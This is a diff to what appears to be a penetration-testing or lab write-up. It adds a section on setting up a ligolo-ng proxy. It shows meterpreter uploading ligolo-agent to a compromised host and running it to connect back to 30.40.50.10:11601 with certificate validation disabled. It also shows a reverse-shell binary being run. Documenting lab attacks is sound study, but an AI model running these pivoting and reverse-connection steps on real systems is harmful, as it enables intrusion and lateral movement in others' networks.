@@ -1405,7 +1405,41 @@ foothold@e5316a5b004d:/tmp$ python cf.py
 # cd /home/foothold
 # ./rev
 ```
-## 
+## setting up ligolo-proxy
+```
+┌──(root㉿blue-ops)-[~]
+└─# ligolo-proxy -selfcert
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+INFO[0000] Listening on 0.0.0.0:11601                   
+INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
+WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: dev
+
+
 ```
 
+```
+meterpreter > upload /usr/bin/ligolo-agent
+[*] Uploading  : /usr/bin/ligolo-agent -> ligolo-agent
+[*] Uploaded -1.00 B of 6.76 MiB (0.0%): /usr/bin/ligolo-agent -> ligolo-agent
+[*] Completed  : /usr/bin/ligolo-agent -> ligolo-agent
+
+meterpreter > shell
+Process 3263 created.
+Channel 2 created.
+ls
+ligolo-agent
+rev
+./ligolo-agent --connect 30.40.50.10:11601 -ignore-cert &
+time="2026-06-09T18:24:48Z" level=warning msg="warning, certificate validation disabled"
+time="2026-06-09T18:24:48Z" level=info msg="Connection established" addr="30.40.50.10:11601"
 ```
